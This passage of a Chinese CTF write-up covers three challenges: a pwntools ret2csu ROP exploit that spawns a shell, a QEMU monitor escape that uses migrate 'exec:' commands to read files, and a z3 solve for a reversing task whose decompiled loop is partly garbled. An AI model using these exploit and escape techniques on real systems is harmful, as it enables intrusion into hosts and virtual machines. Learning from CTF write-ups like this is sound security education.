本题明显提示不能用libc的方法去攻击，所以选择一种方法。
###  利用
  1. 通过通用方法ret2csu来构造rop修改alarm的末字节位’\x19’，指向syscall
  2. csu调用read输入0x3b个字符，设置rax=0x3b(system调用号)
  3. csu调用实现syscall(‘/bin/sh’,0,0),拿到shell。
###  exp
    from pwn import *
    remote_addr=['127.0.0.1',49156] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
    context.terminal = ["/bin/tmux", "sp","-h"]
    context.log_level=True
    #p=remote(remote_addr[0],remote_addr[1])
    elf_path = "./blind"
    p = process(elf_path)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elf = ELF(elf_path)
    #gdb.attach(p, 'c')
    ru = lambda x : p.recvuntil(x)
    sn = lambda x : p.send(x)
    rl = lambda   : p.recvline()
    sl = lambda x : p.sendline(x)
    rv = lambda x : p.recv(x)
    sa = lambda a,b : p.sendafter(a,b)
    sla = lambda a,b : p.sendlineafter(a,b)
    def lg(s,addr = None):
        if addr:
            print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
        else:
            print('\033[1;32;40m[-]  %-20s \033[0m'%(s))
    def raddr(a=6):
        if(a==6):
            return u64(rv(a).ljust(8,'\x00'))
        else:
            return u64(rl().strip('\n').ljust(8,'\x00'))
    def csu(addr,rbx,rbp,r12,r13,r14,r15,ret):
         payload = p64(addr)    
         payload += p64(rbx)     
         payload += p64(rbp)     
         payload += p64(r12)    
         payload += p64(r13)    
         payload += p64(r14)    
         payload += p64(r15)    
         payload += p64(ret)   
         payload += 'A' * 8 * 7     
         return payload
    if __name__ == '__main__':
        bss = 0x601088
        alarm_got = elf.got["alarm"]
        read_plt = elf.got["read"]
        buff = 'A' * 88
        buff += csu(0x4007BA,0,1,read_plt,1,alarm_got,0,0x4007A0) # modify alarm 0x19
        buff += csu(0x4007BA,0,1,read_plt,0x3b,bss,0,0x4007A0) # modify rax=0x3b
        buff += csu(0x4007BA,0,1,alarm_got,0,0,bss,0x4007A0) # syscall('/bin/sh',0,0)
        buff = buff.ljust(0x500,'\x00')
        #gdb.attach(p)
        sn(buff)
        #sn('\x15') # ubuntu 18.04
        sn('\x19') #ubuntu20.04
        sn('/bin/sh\x00'+(0x3b-8)*'A')
        p.interactive()
###  总结
这个是比较常规的栈溢出的利用方式，当时做题思路被带偏了，一直在ret2dll-resolve而自己对ret2dll-resolve不太了解，用集成工具一直拿不到shell，没有想到这种利用方式，还是做题少，思路不够发散灵活。
## PWN -> easy_kernel
###  qemu逃逸
在qemu启动过程中qemu monitor也随之会启动，用来管理qemu的镜像。  
如果qemu启动命令没有-monitor，就有可能存在qemu逃逸  
方法：CTRL+A C进入qemu的monitor模式就可以运行一些命令了。  
monitor模式下migrate命令：`migrate "exec:cp rootfs.img /tmp "`可以执行一些命令
###  题目分析
题目qemu没有关闭monitor，直接ctrl+A C进去逃逸，解压rootfs.img读flag
    migrate "exec:cp rootfs.img /tmp "
    migrate "exec:cd /tmp;zcat rootfs.img | cpio -idmv 1>&2"
    migrate "exec:cat /tmp/flag 1>&2"
    (qemu) migrate "exec:cat /tmp/flag 1>&2"
    flag{test_flag}qemu-system-x86_64: failed to save SaveStateEntry with id(name):)
    qemu-system-x86_64: Unable to write to command: Broken pipe
    qemu-system-x86_64: Unable to write to command: Broken pipe
###  总结
第一次尝试做这个kernel pwn，没想到是个简单的逃逸，考察队qemu逃逸的理解，和monitor下命令的运用。
## Re -> ROR
###  题目分析
题目附件是一个32位的exe文件，ida打开发现如下逻辑：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char v4; // [esp+0h] [ebp-2C0h]
      char v5; // [esp+8Fh] [ebp-231h]
      int v6[9]; // [esp+94h] [ebp-22Ch]
      int j; // [esp+B8h] [ebp-208h]
      unsigned int i; // [esp+BCh] [ebp-204h]
      char Buf2[256]; // [esp+C0h] [ebp-200h] BYREF
      char input[256]; // [esp+1C0h] [ebp-100h] BYREF
      __CheckForDebuggerJustMyCode(&unk_406029);
      v6[0] = 128;
      v6[1] = 64;
      v6[2] = 32;
      v6[3] = 16;
      v6[4] = 8;
      v6[5] = 4;
      v6[6] = 2;
      v6[7] = 1;
      memset(input, 0, sizeof(input));
      memset(Buf2, 0, sizeof(Buf2));
      sub_401650("Input:", v4);
      sub_4016A0("%40s", (char)input);
      if ( strlen(input) != 40 )
        exit(0);
      for ( i = 0; i > ((3 - j) % 8u)) | ((v6[j] & input[i + 2]) > ((2 - j) % 8u)) | ((v6[j] & input[i + 1]) > ((1 - j) % 8u)) | ((v6[j] & (unsigned __int8)input[i]) > (-j % 8u));
          Buf2[j + i] = table[(unsigned __int8)(((v6[j] & (unsigned __int8)input[i + 7]) > ((7 - j) % 8u)) | ((v6[j] & input[i + 6]) > ((6 - j) % 8u)) | ((v6[j] & input[i + 5]) > ((5 - j) % 8u)) | ((v6[j] & input[i + 4]) > ((4 - j) % 8u)) | v5)];
        }
      }
      if ( memcmp(&enc, Buf2, 0x28u) )
      {
        puts("Wrong");
        exit(0);
      }
      puts("Congratulations");
      puts("flag is DASCTF{your input}");
      return 0;
    }
程序逻辑很简单，关键是循环里面的移位转换操作是什么算法，怎么逆向；程序最后的加密密文enc和table表都是知道的，加密流程如下：  
对每个字节进行转换，转换后在table表里索引得到值就是对应的enc，所以首先要将真正的计算结果算出来，所以先拿enc匹配获得table的下标，就是每个字节转换后的结果，之后最方便的方法就是用Z3约束求解，一把梭哈。
###  exp
    enc = [
      0x65, 0x55, 0x24, 0x36, 0x9D, 0x71, 0xB8, 0xC8, 0x65, 0xFB, 
      0x87, 0x7F, 0x9A, 0x9C, 0xB1, 0xDF, 0x65, 0x8F, 0x9D, 0x39, 
      0x8F, 0x11, 0xF6, 0x8E, 0x65, 0x42, 0xDA, 0xB4, 0x8C, 0x39, 
      0xFB, 0x99, 0x65, 0x48, 0x6A, 0xCA, 0x63, 0xE7, 0xA4, 0x79, 
      0xFF, 0xFF, 0xFF, 0xFF 
    ]
    table = [
      0x65, 0x08, 0xF7, 0x12, 0xBC, 0xC3, 0xCF, 0xB8, 0x83, 0x7B, 
      0x02, 0xD5, 0x34, 0xBD, 0x9F, 0x33, 0x77, 0x76, 0xD4, 0xD7, 
      0xEB, 0x90, 0x89, 0x5E, 0x54, 0x01, 0x7D, 0xF4, 0x11, 0xFF, 
      0x99, 0x49, 0xAD, 0x57, 0x46, 0x67, 0x2A, 0x9D, 0x7F, 0xD2, 
      0xE1, 0x21, 0x8B, 0x1D, 0x5A, 0x91, 0x38, 0x94, 0xF9, 0x0C, 
      0x00, 0xCA, 0xE8, 0xCB, 0x5F, 0x19, 0xF6, 0xF0, 0x3C, 0xDE, 
      0xDA, 0xEA, 0x9C, 0x14, 0x75, 0xA4, 0x0D, 0x25, 0x58, 0xFC, 
      0x44, 0x86, 0x05, 0x6B, 0x43, 0x9A, 0x6D, 0xD1, 0x63, 0x98, 
      0x68, 0x2D, 0x52, 0x3D, 0xDD, 0x88, 0xD6, 0xD0, 0xA2, 0xED, 
      0xA5, 0x3B, 0x45, 0x3E, 0xF2, 0x22, 0x06, 0xF3, 0x1A, 0xA8, 
      0x09, 0xDC, 0x7C, 0x4B, 0x5C, 0x1E, 0xA1, 0xB0, 0x71, 0x04, 
      0xE2, 0x9B, 0xB7, 0x10, 0x4E, 0x16, 0x23, 0x82, 0x56, 0xD8, 
      0x61, 0xB4, 0x24, 0x7E, 0x87, 0xF8, 0x0A, 0x13, 0xE3, 0xE4, 
      0xE6, 0x1C, 0x35, 0x2C, 0xB1, 0xEC, 0x93, 0x66, 0x03, 0xA9, 
      0x95, 0xBB, 0xD3, 0x51, 0x39, 0xE7, 0xC9, 0xCE, 0x29, 0x72, 
      0x47, 0x6C, 0x70, 0x15, 0xDF, 0xD9, 0x17, 0x74, 0x3F, 0x62, 
      0xCD, 0x41, 0x07, 0x73, 0x53, 0x85, 0x31, 0x8A, 0x30, 0xAA, 
      0xAC, 0x2E, 0xA3, 0x50, 0x7A, 0xB5, 0x8E, 0x69, 0x1F, 0x6A, 
      0x97, 0x55, 0x3A, 0xB2, 0x59, 0xAB, 0xE0, 0x28, 0xC0, 0xB3, 
      0xBE, 0xCC, 0xC6, 0x2B, 0x5B, 0x92, 0xEE, 0x60, 0x20, 0x84, 
      0x4D, 0x0F, 0x26, 0x4A, 0x48, 0x0B, 0x36, 0x80, 0x5D, 0x6F, 
      0x4C, 0xB9, 0x81, 0x96, 0x32, 0xFD, 0x40, 0x8D, 0x27, 0xC1, 
      0x78, 0x4F, 0x79, 0xC8, 0x0E, 0x8C, 0xE5, 0x9E, 0xAE, 0xBF, 
      0xEF, 0x42, 0xC5, 0xAF, 0xA0, 0xC2, 0xFA, 0xC7, 0xB6, 0xDB, 
      0x18, 0xC4, 0xA6, 0xFE, 0xE9, 0xF5, 0x6E, 0x64, 0x2F, 0xF1, 
      0x1B, 0xFB, 0xBA, 0xA7, 0x37, 0x8F
    ]
    tmp = []
    for i in range(len(enc)):
        for j in range(len(table)):
            if table[j] == enc[i]:
                tmp.append(j)
    print (tmp)
    import z3
    input = [z3.BitVec("p%d" % i,8) for i in range(40)]
    v6 = [0]*8
    v6[0] = 128;
    v6[1] = 64;
    v6[2] = 32;
    v6[3] = 16;
    v6[4] = 8;
    v6[5] = 4;
    v6[6] = 2;
    v6[7] = 1;
    s = z3.Solver()
    for i in range(0,0x28,8):
        for  j in range(8):
            v5 = ((v6[j] & input[i + 3]) > ((3 - j) %  8)) | ((v6[j] & input[i + 2]) > ((2 - j) %  8)) | ((v6[j] & input[i + 1]) > ((1 - j) %  8)) | ((v6[j] & input[i]) > (-j %  8))
            v = ((v6[j] & input[i + 7]) > ((7 - j) %  8)) | ((v6[j] & input[i + 6]) > ((6 - j) %  8)) | ((v6[j] & input[i + 5]) > ((5 - j) %  8)) | ((v6[j] & input[i + 4]) > ((4 - j) %  8))       
            s.add(v5 | v == tmp[i+j])
    sat = s.check()
    m = s.model()
    flag = []
    for i in range(len(m)):
        #print (input[i])
        flag.append(m[input[i]].as_long())
    print (bytes(flag).decode())